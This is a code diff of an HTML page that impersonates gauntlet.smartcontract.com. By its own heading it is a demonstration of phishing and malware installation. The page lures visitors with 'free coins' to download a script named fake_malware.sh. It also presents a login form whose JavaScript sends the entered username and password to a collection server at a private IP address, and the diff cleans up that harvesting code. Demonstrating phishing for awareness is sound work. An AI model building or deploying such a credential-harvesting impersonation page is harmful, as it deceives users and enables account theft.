@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>gauntlet.smartcontract.com</title>
-    <style>
+<style>
         body {
             font-family: Arial, sans-serif;
             line-height: 1.6;
@@ -68,31 +68,33 @@
     </style>
 </head>
 <body>
-    <h1>This site impersonates <u>gauntlet.smartcontract.com</u> domain to demonstrate how it can be used to install malware on users machine and phishing site</h1>
+    <h1>This site impersonates gauntlet.smartcontract.com to demonstrate how it can be used to install malware on users' machines and phishing sites.</h1>
     <div id="login-button">Login</div>
 
-    <p>click <a href="./fake_malware.sh">here</a> and install the software to get free coins</p>
+    <p>Click <a href="./fake_malware.sh">here</a> and install the software to get free coins!</p>
 
     <div id="login-form">
-        <input type="text" placeholder="Username" required>
-        <input type="password" placeholder="Password" required>
-        <button>Login</button>
+        <form id="login-form">
+            <input type="text" id="username" placeholder="Username" required>
+            <input type="password" id="password" placeholder="Password" required>
+            <button type="submit">Login</button>
+        </form>
     </div>
 
     <script>
         const loginButton = document.getElementById('login-button');
         const loginForm = document.getElementById('login-form');
-    
+
         loginButton.addEventListener('click', () => {
-            loginForm.classList.toggle('show');
+            loginForm.style.display = 'block';
         });
-    
+
         loginForm.addEventListener('submit', async (e) => {
             e.preventDefault();
-    
-            const username = document.querySelector('#login-form input[type="text"]').value;
-            const password = document.querySelector('#login-form input[type="password"]').value;
-    
+
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
             try {
                 const response = await fetch('http://192.168.1.3:8080/process-login', {
                     method: 'POST',
@@ -101,17 +103,17 @@
                     },
                     body: JSON.stringify({ username, password }),
                 });
-    
+
                 if (!response.ok) {
                     throw new Error('Network response was not ok');
                 }
-    
+
                 const data = await response.json();
-                console.log(data); // Process the received data
+                console.log(data);
             } catch (error) {
                 console.error('There was a problem with the fetch operation:', error.message);
             }
         });
-    </script>    
+    </script>
 </body>
 </html>
